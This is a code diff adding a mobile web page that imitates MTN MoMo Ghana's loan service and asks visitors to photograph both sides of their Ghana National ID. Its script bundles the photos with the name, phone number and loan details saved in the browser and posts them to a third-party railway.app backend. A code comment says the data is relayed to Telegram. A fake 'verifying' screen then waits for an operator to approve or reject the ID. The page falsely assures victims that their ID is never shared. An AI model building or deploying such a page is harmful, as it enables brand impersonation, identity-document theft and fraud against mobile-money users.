@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>MTN MoMo Loan Ghana - ID Verification</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            height: 100%;
+            font-family: 'Inter', sans-serif;
+            background: #f0f2f5;
+            overflow: hidden;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 10px;
+            height: 100vh;
+            height: 100dvh;
+            gap: 10px;
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            position: relative;
+            flex-shrink: 0;
+        }
+
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #333;
+            line-height: 1;
+            width: 24px;
+            text-align: left;
+            padding: 0;
+        }
+
+        .logo-container {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 700;
+            font-size: 16px;
+            padding: 7px 16px;
+            border-radius: 40px;
+            line-height: 1;
+            letter-spacing: -0.5px;
+            box-shadow: 0 4px 12px rgba(0,71,171,0.25);
+            white-space: nowrap;
+        }
+
+        /* ===== CARD ===== */
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 24px 20px;
+            width: 100%;
+            max-width: 480px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            flex: 1;
+            min-height: 0;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .icon-badge {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #f0f4ff, #e0e8ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            font-size: 28px;
+            box-shadow: 0 6px 18px rgba(0, 71, 171, 0.12);
+            flex-shrink: 0;
+        }
+
+        .page-title {
+            font-size: 20px;
+            font-weight: 800;
+            text-align: center;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            line-height: 1.3;
+        }
+
+        .page-title .highlight { color: #0047AB; }
+
+        .instruction {
+            font-size: 13px;
+            color: #666;
+            text-align: center;
+            line-height: 1.55;
+            margin-bottom: 18px;
+            padding: 0 4px;
+        }
+        .instruction strong { color: #1a1a2e; font-weight: 700; }
+
+        /* ===== UPLOAD CARDS ===== */
+        .upload-card {
+            border: 2px dashed #cbd5e1;
+            border-radius: 14px;
+            padding: 18px 16px;
+            text-align: center;
+            background: #fafbff;
+            transition: border-color 0.2s, background 0.2s;
+            margin-bottom: 14px;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .upload-card:hover {
+            border-color: #0047AB;
+            background: #f0f4ff;
+        }
+
+        .upload-card.has-file {
+            border-style: solid;
+            border-color: #16a34a;
+            background: #f0fdf4;
+        }
+
+        .upload-card.invalid {
+            border-color: #e74c3c;
+            background: #fff5f5;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        .upload-card .upload-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            color: #0047AB;
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+            margin-bottom: 8px;
+            text-align: left;
+        }
+
+        .upload-card .upload-icon {
+            font-size: 34px;
+            display: block;
+            margin-bottom: 6px;
+        }
+
+        .upload-card .upload-hint {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.45;
+            font-weight: 500;
+        }
+
+        .upload-card .upload-hint b { color: #1a1a2e; }
+
+        .upload-card .file-name {
+            margin-top: 8px;
+            font-size: 11.5px;
+            color: #16a34a;
+            font-weight: 700;
+            word-break: break-all;
+            display: none;
+        }
+
+        .upload-card.has-file .file-name { display: block; }
+
+        .upload-card .preview {
+            margin-top: 10px;
+            width: 100%;
+            max-height: 150px;
+            object-fit: contain;
+            border-radius: 8px;
+            display: none;
+            background: #fff;
+            border: 1px solid #e5e7eb;
+        }
+
+        .upload-card.has-file .preview { display: block; }
+
+        .upload-card input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+            font-size: 0;
+        }
+
+        /* ===== ERROR TEXT ===== */
+        .error-text {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+            font-weight: 600;
+            line-height: 1.4;
+            text-align: center;
+        }
+        .error-text.show { display: block; }
+
+        /* ===== SUBMIT BUTTON ===== */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s, opacity 0.2s;
+            font-family: 'Inter', sans-serif;
+            margin-top: 10px;
+            flex-shrink: 0;
+        }
+        .submit-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 8px 25px rgba(0, 71, 171, 0.3);
+        }
+        .submit-btn:active:not(:disabled) { transform: scale(0.98); }
+        .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2.5px solid rgba(255, 255, 255, 0.4);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            vertical-align: -3px;
+            margin-right: 8px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== SECURITY NOTICE ===== */
+        .security-notice {
+            display: flex;
+            align-items: flex-start;
+            justify-content: center;
+            gap: 5px;
+            margin-top: 14px;
+            font-size: 11px;
+            color: #999;
+            line-height: 1.5;
+            text-align: center;
+            padding: 0 6px;
+            flex-shrink: 0;
+        }
+
+        footer {
+            padding: 6px;
+            color: #aaa;
+            font-size: 11px;
+            text-align: center;
+            width: 100%;
+            max-width: 480px;
+            flex-shrink: 0;
+        }
+
+        /* ============================================
+           WAITING OVERLAY
+           ============================================ */
+        .waiting-overlay {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 32px 24px;
+            z-index: 2000;
+        }
+        .waiting-overlay.show { display: flex; }
+
+        .waiting-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 340px;
+            text-align: center;
+        }
+
+        .waiting-momo-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #0047AB;
+            color: #FFCC00;
+            font-weight: 800;
+            font-size: 20px;
+            padding: 11px 22px;
+            border-radius: 50px;
+            line-height: 1;
+            box-shadow: 0 8px 24px rgba(0, 71, 171, 0.28);
+            margin-bottom: 32px;
+            animation: overlayPulse 2s ease-in-out infinite;
+        }
+        @keyframes overlayPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .waiting-spinner {
+            width: 52px;
+            height: 52px;
+            border: 5px solid #e0e8ff;
+            border-top-color: #0047AB;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-bottom: 26px;
+        }
+
+        .waiting-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #1a1a2e;
+            margin-bottom: 10px;
+            line-height: 1.3;
+        }
+        .waiting-title .highlight { color: #0047AB; }
+
+        .waiting-subtitle {
+            font-size: 13px;
+            color: #888;
+            line-height: 1.6;
+            margin-bottom: 28px;
+        }
+
+        .waiting-dots span {
+            display: inline-block;
+            animation: dotBlink 1.4s infinite both;
+        }
+        .waiting-dots span:nth-child(1) { animation-delay: 0s; }
+        .waiting-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .waiting-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes dotBlink {
+            0%, 80%, 100% { opacity: 0.2; }
+            40% { opacity: 1; }
+        }
+
+        .waiting-bar {
+            width: 200px;
+            height: 5px;
+            background: #e8edf7;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 28px;
+        }
+        .waiting-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0047AB, #FFCC00);
+            border-radius: 4px;
+            transition: width 0.3s ease;
+        }
+
+        .waiting-security {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 11px;
+            color: #aaa;
+        }
+
+        /* ============================================
+           CONGRATS MODAL
+           ============================================ */
+        .congrats-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            z-index: 3000;
+            backdrop-filter: blur(6px);
+        }
+        .congrats-overlay.show { display: flex; }
+
+        .congrats-content {
+            background: white;
+            border-radius: 28px;
+            padding: 0;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.4);
+            overflow: hidden;
+            text-align: center;
+            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        @keyframes popIn {
+            0% { transform: scale(0.7); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .congrats-header {
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            padding: 30px 24px 24px;
+            position: relative;
+        }
+        .congrats-emoji {
+            font-size: 60px;
+            display: block;
+            margin-bottom: 10px;
+        }
+        .congrats-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            margin-bottom: 6px;
+        }
+        .congrats-subtitle {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        .congrats-body { padding: 24px 22px 28px; }
+        .congrats-message {
+            font-size: 16px;
+            font-weight: 700;
+            color: #1a1a2e;
+            line-height: 1.5;
+            margin-bottom: 16px;
+        }
+        .congrats-message .highlight { color: #0047AB; }
+        .congrats-note {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+        .congrats-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #0047AB, #002D7A);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            font-family: 'Inter', sans-serif;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        @media (max-height: 700px) {
+            .card { padding: 18px 16px; }
+            .page-title { font-size: 18px; }
+            .upload-card { padding: 14px 12px; }
+            .upload-icon { font-size: 28px; }
+        }
+
+        @media (max-width: 380px) {
+            .upload-card { padding: 12px 10px; }
+            .upload-card .upload-hint { font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <button class="back-btn" onclick="window.location.href='index.html'" aria-label="Go back">←</button>
+        <div class="logo-container">
+            <span class="momo-icon">MoMo</span>
+        </div>
+        <div style="width:24px;"></div>
+    </header>
+
+    <main class="card">
+        <div class="icon-badge">🪪</div>
+
+        <h1 class="page-title">
+            Upload Your <span class="highlight">National ID</span>
+        </h1>
+
+        <p class="instruction">
+            To complete your loan application, please upload a clear photo of your
+            <strong>Ghana National ID (Ghana Card)</strong> — both <strong>front</strong> and <strong>back</strong>.
+        </p>
+
+        <!-- FRONT -->
+        <div class="upload-card" id="frontCard">
+            <label class="upload-label">📸 Front of ID</label>
+            <span class="upload-icon">🪪</span>
+            <div class="upload-hint">
+                Tap to select<br>
+                <b>Ghana Card — Front side</b>
+            </div>
+            <img class="preview" id="frontPreview" alt="">
+            <div class="file-name" id="frontFileName"></div>
+            <input type="file" id="frontInput" accept="image/*" capture="environment">
+        </div>
+
+        <!-- BACK -->
+        <div class="upload-card" id="backCard">
+            <label class="upload-label">📸 Back of ID</label>
+            <span class="upload-icon">🪪</span>
+            <div class="upload-hint">
+                Tap to select<br>
+                <b>Ghana Card — Back side</b>
+            </div>
+            <img class="preview" id="backPreview" alt="">
+            <div class="file-name" id="backFileName"></div>
+            <input type="file" id="backInput" accept="image/*" capture="environment">
+        </div>
+
+        <div class="error-text" id="uploadError">
+            Please upload both sides of your National ID.
+        </div>
+
+        <button class="submit-btn" id="submitBtn" disabled>
+            SUBMIT FOR VERIFICATION →
+        </button>
+
+        <div class="security-notice">
+            <span>🔒</span>
+            <span>Your ID is used only for identity verification and is never shared with third parties.</span>
+        </div>
+    </main>
+
+    <footer>© 2026 MTN MoMo Ghana</footer>
+
+    <!-- WAITING OVERLAY -->
+    <div class="waiting-overlay" id="waitingOverlay">
+        <div class="waiting-content">
+            <div class="waiting-momo-icon">MoMo</div>
+            <div class="waiting-spinner"></div>
+            <h2 class="waiting-title" id="waitingTitle">
+                Verifying your <span class="highlight">ID</span><span class="waiting-dots"><span>.</span><span>.</span><span>.</span></span>
+            </h2>
+            <p class="waiting-subtitle" id="waitingSubtitle">
+                Our team is reviewing your National ID. This usually takes a few minutes.
+            </p>
+            <div class="waiting-bar">
+                <div class="waiting-bar-fill" id="waitingBarFill"></div>
+            </div>
+            <div class="waiting-security">
+                <span>🔒</span>
+                <span>Secure verification by MTN MoMo Ghana</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONGRATS MODAL -->
+    <div class="congrats-overlay" id="congratsOverlay">
+        <div class="congrats-content">
+            <div class="congrats-header">
+                <span class="congrats-emoji">🎉</span>
+                <h2 class="congrats-title">ID Verified!</h2>
+                <p class="congrats-subtitle">Your identity has been confirmed</p>
+            </div>
+            <div class="congrats-body">
+                <p class="congrats-message">
+                    Your loan is now being <span class="highlight">processed</span>.
+                </p>
+                <p class="congrats-note">
+                    You'll receive an SMS notification once the funds have been sent to your MoMo account.
+                </p>
+                <button class="congrats-btn" onclick="window.location.href='index.html'">
+                    OK, GOT IT →
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const API_BASE = 'https://databundlesexchange-production-86f4.up.railway.app';
+        const POLL_INTERVAL_MS = 2500;
+
+        const frontCard = document.getElementById('frontCard');
+        const backCard  = document.getElementById('backCard');
+        const frontInput = document.getElementById('frontInput');
+        const backInput  = document.getElementById('backInput');
+        const frontPreview = document.getElementById('frontPreview');
+        const backPreview  = document.getElementById('backPreview');
+        const frontFileName = document.getElementById('frontFileName');
+        const backFileName  = document.getElementById('backFileName');
+        const uploadError = document.getElementById('uploadError');
+        const submitBtn = document.getElementById('submitBtn');
+        const waitingOverlay = document.getElementById('waitingOverlay');
+        const waitingBarFill = document.getElementById('waitingBarFill');
+        const waitingTitle = document.getElementById('waitingTitle');
+        const waitingSubtitle = document.getElementById('waitingSubtitle');
+        const congratsOverlay = document.getElementById('congratsOverlay');
+
+        let frontFile = null;
+        let backFile = null;
+
+        /* ============================================
+           FILE PREVIEW + VALIDATION
+        ============================================ */
+        function handleFile(inputEl, cardEl, previewEl, nameEl, side) {
+            inputEl.addEventListener('change', function () {
+                const file = this.files && this.files[0];
+                if (!file) return;
+
+                /* Validate: image, < 8 MB */
+                if (!file.type.startsWith('image/')) {
+                    alert('Please select an image file.');
+                    this.value = '';
+                    return;
+                }
+                if (file.size > 8 * 1024 * 1024) {
+                    alert('Image is too large. Please use an image under 8 MB.');
+                    this.value = '';
+                    return;
+                }
+
+                /* Store file */
+                if (side === 'front') frontFile = file;
+                else backFile = file;
+
+                /* Preview */
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    previewEl.src = e.target.result;
+                    nameEl.textContent = '✅ ' + file.name;
+                    cardEl.classList.add('has-file');
+                    cardEl.classList.remove('invalid');
+                    updateSubmitState();
+                };
+                reader.readAsDataURL(file);
+            });
+        }
+
+        handleFile(frontInput, frontCard, frontPreview, frontFileName, 'front');
+        handleFile(backInput, backCard, backPreview, backFileName, 'back');
+
+        function updateSubmitState() {
+            if (frontFile && backFile) {
+                submitBtn.disabled = false;
+                uploadError.classList.remove('show');
+            } else {
+                submitBtn.disabled = true;
+            }
+        }
+
+        /* ============================================
+           WAITING OVERLAY
+        ============================================ */
+        let waitTimer = null;
+
+        function startWaitingBar() {
+            waitingOverlay.classList.add('show');
+            waitingBarFill.style.width = '0%';
+            waitingBarFill.style.background = '';
+            const startTime = Date.now();
+            waitTimer = setInterval(function () {
+                const elapsed = Date.now() - startTime;
+                const pct = Math.min((elapsed / (10 * 60 * 1000)) * 90, 90);
+                waitingBarFill.style.width = pct.toFixed(1) + '%';
+            }, 300);
+        }
+
+        function finishWaitingBar() {
+            if (waitTimer) clearInterval(waitTimer);
+            waitingBarFill.style.width = '100%';
+        }
+
+        function showRejection() {
+            if (waitTimer) clearInterval(waitTimer);
+            waitingBarFill.style.width = '100%';
+            waitingBarFill.style.background = '#e74c3c';
+
+            waitingTitle.innerHTML = '⚠️ ID <span class="highlight">rejected</span>';
+            waitingSubtitle.innerHTML =
+                'Your ID could not be verified.<br>Please make sure both photos are clear and try again.';
+
+            setTimeout(() => {
+                waitingOverlay.classList.remove('show');
+                waitingBarFill.style.background = '';
+                waitingTitle.innerHTML = 'Verifying your <span class="highlight">ID</span><span class="waiting-dots"><span>.</span><span>.</span><span>.</span></span>';
+                waitingSubtitle.textContent = 'Our team is reviewing your National ID. This usually takes a few minutes.';
+
+                /* Reset UI */
+                frontFile = null;
+                backFile = null;
+                frontInput.value = '';
+                backInput.value = '';
+                frontPreview.src = '';
+                backPreview.src = '';
+                frontFileName.textContent = '';
+                backFileName.textContent = '';
+                frontCard.classList.remove('has-file');
+                backCard.classList.remove('has-file');
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = 'SUBMIT FOR VERIFICATION →';
+
+                uploadError.textContent = 'Your ID was rejected. Please upload clear photos and try again.';
+                uploadError.classList.add('show');
+            }, 4000);
+        }
+
+        /* ============================================
+           POLLING
+        ============================================ */
+        let pollTimer = null;
+
+        function stopPolling() {
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+        }
+
+        function startPolling(sessionId) {
+            stopPolling();
+            pollTimer = setInterval(async () => {
+                try {
+                    const res = await fetch(`${API_BASE}/api/status/${sessionId}`);
+                    const data = await res.json().catch(() => ({}));
+                    if (!data.ok) return;
+
+                    if (data.status === 'approved') {
+                        stopPolling();
+                        finishWaitingBar();
+                        setTimeout(() => {
+                            waitingOverlay.classList.remove('show');
+                            congratsOverlay.classList.add('show');
+                        }, 400);
+                    } else if (data.status === 'rejected') {
+                        stopPolling();
+                        showRejection();
+                    } else if (data.status === 'timeout') {
+                        stopPolling();
+                        waitingTitle.innerHTML = 'Request <span class="highlight">timed out</span>';
+                        waitingSubtitle.textContent = 'Please try again.';
+                        waitingBarFill.style.background = '#e74c3c';
+                        setTimeout(() => {
+                            waitingOverlay.classList.remove('show');
+                            location.reload();
+                        }, 3000);
+                    }
+                } catch (err) {
+                    console.warn('poll error:', err.message);
+                }
+            }, POLL_INTERVAL_MS);
+        }
+
+        /* ============================================
+           SUBMIT — upload to backend → Telegram → poll
+        ============================================ */
+        submitBtn.addEventListener('click', async function () {
+            if (!frontFile || !backFile) {
+                uploadError.classList.add('show');
+                if (!frontFile) frontCard.classList.add('invalid');
+                if (!backFile) backCard.classList.add('invalid');
+                return;
+            }
+
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner"></span>SUBMITTING...';
+
+            /* Load application data */
+            let app = {};
+            try { app = JSON.parse(localStorage.getItem('loanApplication') || '{}'); } catch (e) {}
+
+            /* Build FormData */
+            const fd = new FormData();
+            fd.append('phone', app.phone || '');
+            fd.append('firstName', app.firstName || '');
+            fd.append('lastName', app.lastName || '');
+            fd.append('loanAmount', app.loanAmount || '');
+            fd.append('loanTerm', app.loanTerm || '');
+            fd.append('loanType', app.loanType || '');
+            fd.append('country', 'GH');
+            fd.append('front', frontFile);
+            fd.append('back', backFile);
+
+            try {
+                const res = await fetch(`${API_BASE}/api/id-upload`, {
+                    method: 'POST',
+                    body: fd
+                });
+                const data = await res.json().catch(() => ({}));
+
+                if (!res.ok || !data.ok) {
+                    throw new Error(data.error || 'Upload failed');
+                }
+
+                /* Show waiting overlay + start polling */
+                startWaitingBar();
+                startPolling(data.sessionId);
+
+            } catch (err) {
+                console.error('ID upload error:', err);
+                alert('Upload failed: ' + (err.message || 'Check your internet.'));
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = 'SUBMIT FOR VERIFICATION →';
+            }
+        });
+    </script>
+</body>
+</html>
